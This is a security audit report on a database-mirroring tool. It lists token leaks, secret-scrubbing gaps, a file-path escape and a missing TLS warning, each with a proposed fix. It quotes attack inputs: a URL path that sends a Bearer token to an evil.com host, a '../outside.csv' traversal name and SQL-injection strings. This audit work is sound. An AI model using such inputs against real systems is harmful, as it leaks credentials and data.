# Shakedown 2026-11-15: security

Status: needs-triage

From P18. Set-up: wheel 0.2.0, Postgres 16. Not covered: ODBC, TLS servers, a CVE scan, key rotation.

## Findings

1. ✓ **[Leak] Whoever can write `_rowvioli.tables` can send a REST source's token to a host of their choice.**
   `rest.py:41` requests `connection["url"] + path`, and `path` is an option stored in plain text. With
   `url = "https://api.example.com"`, `path = ".evil.com/x"` sends the Bearer token to `api.example.com.evil.com`;
   `@host/..` returns attacker data into the mirror. Contradicts README:584 ("cannot point a password at
   another server"). Idea: require `path` to start with `/`, or join and check that the host is unchanged.
2. ✓ **[Leak] A secret with a newline, quote, backslash or non-ASCII character is not scrubbed when a driver
   prints its repr.** `load.scrub` (`load.py:270`) replaces only the literal value. `TOK=$'tok…\n'` gives
   `Illegal header value b'Bearer tok…\n'` in `runs.reason`, the status view, the worker log and the JSON.
   A trailing newline is common for Docker secrets and files. Idea: also scrub `repr(value)[1:-1]` and the
   stripped value, or reject control characters at `apply`. documented: "best effort" (open points), not this case.
3. ✓ **[Leak, minor] Short connection values are scrubbed inside words.** With the password `x`, a reason reads
   `operator does not e***ist`; the user name and the port are scrubbed too (see `install-target.md` 3).
   Found while verifying. Idea: scrub only the secrets (password, token), not every value of the connection.
4. ✓ **[Misfit] The file connector reads outside its `path`.** `file.py:20` joins `path / table`; a table
   `"../outside.csv"` or an absolute path is loaded. A definition-author or target-writer power. Idea:
   resolve and refuse a path outside `path`.
5. **[Trap] The README never mentions TLS.** libpq's default `sslmode=prefer` falls back to plain text, and a
   REST `http://` URL is accepted silently. Idea: one README line recommending `sslmode=verify-full`.
6. **[Leak, minor] The REST connector writes a source value into the reason** (`f"... {v!r} does not fit"`),
   which goes to the status view and the log.

## What held up

- SQL injection through table and column names (`a"b; drop table x`, `c"ol; select 1--`, emoji): everything quoted, log and history view built correctly.
- Sealing and binding of connections; passwords with `/`, `@`, `%` in a URL; the target password stays out of errors.
- The minimum worker role from the README's rights table ran a full load.
- Licences all permissive. Note: the wheel's dependencies have no bounds at all.
